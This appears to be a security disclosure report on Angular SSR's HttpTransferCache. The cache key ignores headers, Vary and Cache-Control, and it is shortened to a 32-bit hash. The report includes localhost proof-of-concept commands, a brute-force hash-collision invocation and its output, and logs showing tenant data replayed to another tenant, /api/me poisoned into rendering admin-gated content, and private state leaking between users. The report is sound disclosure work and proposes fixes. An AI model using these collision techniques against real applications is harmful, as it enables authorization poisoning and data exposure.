# Angular SSR HttpTransferCache replays responses across security-distinct requests

## Summary

Angular SSR `HttpTransferCache` is enabled by default through `provideClientHydration()`. During SSR,
it caches server-side `HttpClient` GET/HEAD responses, serializes them into the HTML `ng-state`
script, and replays them to later `HttpClient` consumers during the same SSR/hydration boundary.

The cache key does not include security-relevant request/response dimensions:

- request headers such as `Cookie`, `X-Tenant`, `Accept-Language`, or API-version headers;
- credentials mode;
- backend `Vary`;
- backend `Cache-Control: private` or `Cache-Control: no-store`.

The final `TransferState` key is also reduced to a 32-bit hash. Angular does not compare the original
full request key before replaying a cached response.

This allows Angular to return a response generated for one security context to a different
`HttpClient` request. The first impact case reproduces in a normal Angular SSR app without a proxy,
without a chosen collision, and without a deliberately vulnerable cache. Additional PoCs show how the
same framework primitive can poison a trusted `/api/me` consumer and can leak private serialized
state cross-user when SSR HTML is shared by an outer cache.

This report is not about HTTP request smuggling. It is a framework-level trusted response replay /
cache-key confusion issue in Angular SSR `HttpTransferCache`.

## Product / Component

- Product: Angular
- Component: `@angular/common/http` `HttpTransferCache` with SSR/hydration
- Relevant APIs:
  - `provideClientHydration()`
  - `provideHttpClient()`
  - `renderApplication()`
  - `TransferState`

## Angular-controlled behavior

The vulnerable primitive is framework-owned:

- Angular enables HTTP transfer caching by default through `provideClientHydration()`.
- Angular decides which `HttpClient` requests are eligible for caching.
- Angular computes the transfer-cache key.
- Angular stores the response body in `TransferState`.
- Angular serializes `TransferState` into the HTML `ng-state` script.
- Angular replays the cached response to later `HttpClient` consumers before dispatching to the
  backend.

The final application impact depends on normal SSR usage patterns, such as tenant headers,
cookie-forwarded API calls, attacker-influenced SSR fetches, or shared HTML caching. The incorrect
trusted-response replay happens inside Angular.

## Source references

Observed in local Angular source:

```text
targets/angular/packages/platform-browser/src/hydration.ts:283-285
```

`provideClientHydration()` enables `ɵwithHttpTransferCache({})` unless explicitly disabled.

```text
targets/angular/packages/common/http/src/transfer_cache.ts:126-143
```

Default cache eligibility excludes `Authorization` and `Proxy-Authorization`, but does not exclude
`Cookie`, other request headers, credentials mode, `Vary`, or `Cache-Control: private/no-store`.

```text
targets/angular/packages/common/http/src/transfer_cache.ts:182-188
```

Angular looks up and returns a cached response before backend dispatch.

```text
targets/angular/packages/common/http/src/transfer_cache.ts:322-341
```

The full cache key is built from:

```text
[method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|')
```

It does not include request headers, `Cookie`, credentials mode, response `Vary`, or response
`Cache-Control`.

The request-param portion is also ambiguous before hashing:

```text
targets/angular/packages/common/http/src/transfer_cache.ts:315-319
```

`sortAndConcatParams()` interpolates `params.getAll(k)` directly. Since `getAll()` returns an array,
string coercion joins values with commas:

```text
role=user&role=admin -> role=user,admin
role=user,admin      -> role=user,admin
```

These two semantically distinct parameter sets collide before the 32-bit hash is applied.

```text
targets/angular/packages/common/http/src/transfer_cache.ts:349-361
```

The key is reduced to a 32-bit hash before `makeStateKey()`.

```text
targets/angular/packages/platform-server/src/transfer_state.ts:70-112
```

Angular serializes `TransferState` into an HTML script:

```html
<script id="ng-state" type="application/json">...</script>
```

```text
targets/angular/adev/src/content/guide/ssr.md:428-445
```

Angular documents that `HttpClient` caches outgoing network requests during SSR and serializes them
into the initial HTML.

## Impact demonstration 1: Vary/header variant confusion in a normal Angular SSR app

This case demonstrates the framework issue without a chosen hash collision and without an outer
proxy/cache.

The app uses normal Angular SSR APIs:

```text
bootstrapApplication()
provideClientHydration()
provideHttpClient(withFetch())
renderApplication()
```

The backend endpoint returns different bodies based on `X-Tenant`:

```text
GET /api/data
Vary: X-Tenant
Cache-Control: private, no-store
```

During one SSR render, the component performs two same-URL requests:

```text
GET /api/data with X-Tenant: tenant-a
GET /api/data with X-Tenant: tenant-b
```

Expected behavior:

```text
tenant:tenant-a|tenant:tenant-b
```

Observed behavior:

```html
<div id="a">tenant:tenant-a</div>
<div id="b">tenant:tenant-a</div>
```

Observed `ng-state`:

```json
{"1951339085":{"b":"tenant:tenant-a","u":"http://127.0.0.1:4230/api/data","rt":"text"}}
```

Observed backend log:

```text
[api] /api/data hit 1 tenant= "tenant-a"
[express] /multitenant complete, /api/data backend hits= 1
```

The `tenant-b` request did not reach the backend. Angular replayed the tenant A response even though
the backend explicitly declared `Vary: X-Tenant` and `Cache-Control: private, no-store`.

Security impact:

- A tenant-, locale-, feature-, or API-version-varied response can be replayed to a different request
  variant during SSR/hydration.
- Backend `Vary` does not protect the response from Angular's transfer-cache replay.
- Backend `Cache-Control: private/no-store` does not prevent Angular from serializing the response
  into `ng-state`.

## Impact demonstration 2: chosen 32-bit collision poisons `/api/me`

This case shows that the 32-bit `StateKey` can be chosen against a fixed sensitive endpoint when an
attacker can influence another SSR-fetched URL in the same render.

PoC file:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/server.ts
```

Commands:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
curl -sS -H 'Cookie: sid=alice' 'http://127.0.0.1:4218/?feed=uibaalzu'
```

Chosen collision:

```text
GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||
GET|json|http://127.0.0.1:4218/api/me||
StateKey: 2884615638
```

The backend behavior is:

```text
/feed?x=uibaalzu -> {"user":"attacker","role":"admin","source":"feed"}
/api/me with Cookie: sid=alice -> {"user":"alice","role":"user", ...}
```

The SSR component renders `ADMIN_PANEL_SECRET` only if the `/api/me` result has `role === "admin"`.

Observed HTML:

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
```

Observed server log:

```text
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] feed body: {"user":"attacker","role":"admin","source":"feed"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

`/api/me` was never called. Angular replayed the attacker-controlled feed response as the trusted
`/api/me` response, and the SSR component rendered admin-gated content.

This is not a backend authorization bypass by itself. It demonstrates that SSR authorization,
bootstrap, entitlement, feature-flag, or tenant decisions that trust a transfer-cached `HttpClient`
response can be poisoned by an attacker-controlled colliding response.

Collision verification command:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/../../..
node bugs/angular/a18-transfer-cache-request-variant-confusion/poc/find_chosen_transfer_cache_collision.mjs 'GET|json|http://127.0.0.1:4218/feed?x=' 'GET|json|http://127.0.0.1:4218/api/me||' '||' 'abcdefghijklmnopqrstuvwxyz0123456789' 4 4
```

Observed output:

```json
{
  "suffix": "uibaalzu",
  "attackerKey": "GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||",
  "targetKey": "GET|json|http://127.0.0.1:4218/api/me||",
  "rawHash": 737131990,
  "finalStateKey": "2884615638",
  "verify": true
}
```

## Impact demonstration 3: deterministic request-param collision

This case does not require brute-forcing the 32-bit hash. Angular's param key construction collapses
repeated values and comma-containing scalar values before hashing.

PoC file:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/deterministic_params_collision_server.ts
```

Commands:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx deterministic_params_collision_server.ts
curl -sS 'http://127.0.0.1:4222/'
```

The backend treats these requests differently:

```text
/api/scope?role=user&role=admin -> multi:user|admin
/api/scope?role=user,admin      -> scalar:user,admin
```

Observed HTML:

```html
<div id="scope">first=multi:user|admin|second=multi:user|admin</div>
```

Expected if the second request reached the backend:

```html
<div id="scope">first=multi:user|admin|second=scalar:user,admin</div>
```

Observed server log:

```text
[api] /api/scope hit 1 url= /api/scope?role=user&role=admin body= multi:user|admin
[ssr] first scope body: multi:user|admin
[ssr] second scope body: multi:user|admin
[express] api hit counts scope= 1
```

The second request did not reach the backend. Angular replayed the repeated-param response to the
comma-scalar request.

## Impact demonstration 4: private/no-store API body becomes shareable HTML state

This case shows the confidentiality chain when SSR HTML is stored by an outer shared cache. The
shared cache is a deployment condition, but Angular is the component that copies a private API body
into the HTML document.

PoC file:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app/shared_cache_private_state_server.ts
```

The origin Angular SSR app fetches:

```text
GET /api/private
Vary: Cookie
Cache-Control: private, no-store
Body: private:<cookie>
```

Commands:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx shared_cache_private_state_server.ts
curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

Alice response:

```text
X-Proxy-Cache: MISS
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

Bob response:

```text
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state" type="application/json">{"3517752801":{"b":"private:sid=alice","h":{},"s":200,"st":"OK","u":"http://127.0.0.1:4220/api/private","rt":"text"},"__nghData__":[{}]}</script>
```

Bob sent `Cookie: sid=bob` but received Alice's private API body in both rendered HTML and
`ng-state`.

The outer shared cache is not created by Angular. The Angular-specific issue is that a response that
the backend marked `Vary: Cookie` and `Cache-Control: private, no-store` was serialized into the HTML
document without Angular honoring those cache-safety signals.

## Independent verification

An independent verifier reviewed the Angular source and reproduced the runtime behavior without
trusting the existing report wording.

Confirmed independently:

- default transfer cache is enabled through `provideClientHydration()`;
- the cache key omits request headers, `Cookie`, credentials mode, response `Vary`, and response
  `Cache-Control`;
- the final key is a 32-bit hash;
- the existing PoC replays attacker-controlled `/feed` JSON into `/api/me`;
- the shared-cache PoC leaks Alice's private `ng-state` to Bob under the stated deployment
  condition;
- a fresh normal Angular SSR app, without chosen collision, reproduces the `Vary: X-Tenant` issue as
  `tenant:tenant-a|tenant:tenant-a` with one backend hit.

Independent verification artifact:

```text
bugs/angular/a18-transfer-cache-request-variant-confusion/evidence/2026-04-29-independent-verification.md
```

## Why this is attributable to Angular

This report does not claim that Angular alone creates every final deployment impact. It claims that
Angular creates the unsafe trusted-response replay primitive by default.

Angular-controlled:

- cache enabled by default via `provideClientHydration()`;
- request eligibility decision;
- cache key generation;
- 32-bit `StateKey` generation;
- `TransferState` storage and HTML serialization;
- replay of cached response before backend dispatch.

Application/deployment conditions:

- whether the app forwards inbound cookies to backend APIs;
- whether the app fetches attacker-influenced URLs during SSR;
- whether the app gates sensitive SSR content on `/api/me` or similar bootstrap endpoints;
- whether an outer cache shares SSR HTML across users.

The first impact case requires only normal SSR app behavior and Angular defaults. The second and
third cases show how common SSR patterns turn the same framework primitive into authorization-data
poisoning and private-state leakage.

## Suggested fixes

Possible mitigations in Angular:

- Do not cache responses with `Vary` unless Angular can honor every listed request-header dimension.
- Include `Vary`-listed request headers in the transfer-cache key.
- Do not cache responses with `Cache-Control: no-store` or `private` unless the application
  explicitly opts in.
- Treat `Cookie` and credential-bearing requests as auth-sensitive by default, similar to
  `Authorization`.
- Replace the 32-bit state key with a collision-resistant key, or store and compare the original full
  request key before replay.
- Document prominently that `includeHeaders` only transfers headers and does not make Angular honor
  `Vary` or `Cache-Control` semantics.

## Scope / limitations

- This is not HTTP request smuggling.
- This is not a direct backend authorization bypass.
- Separate SSR renders receive separate `TransferState` instances; cross-user leakage requires HTML
  reuse or shared caching.
- Apps can mitigate sensitive endpoints with `withNoHttpTransferCache()`, a `filter`, or
  request-level `transferCache: false`.
- The framework issue remains that Angular's default cache semantics can replay trusted responses
  across security-distinct requests while ignoring standard backend cache-safety signals.
